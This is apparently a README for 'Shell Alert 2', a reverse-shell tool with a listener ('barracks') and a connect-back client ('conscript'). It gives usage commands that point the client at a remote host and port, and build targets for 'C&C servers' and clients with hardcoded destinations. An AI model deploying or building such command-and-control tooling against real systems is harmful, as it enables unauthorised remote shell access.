# Shell Alert 2

Based of the work done by [adedayo](https://github.com/adedayo/reverse-shell).

## Usage

server (`barracks`)

```bash
barracks <port to listen on>
```

client (`conscript`)

```bash
conscript <ip/hostname of barracks> <port of barracks>
```

## Build

Build C&C servers to `./bin/buildings` 

```
make buildings
```

Build clients to `./bin/units` 

```
make units
```

**Note:** units_harcoded have their destination set within the build package. Update the `Makefile` to match your destination.

Build everything

```
make all
```
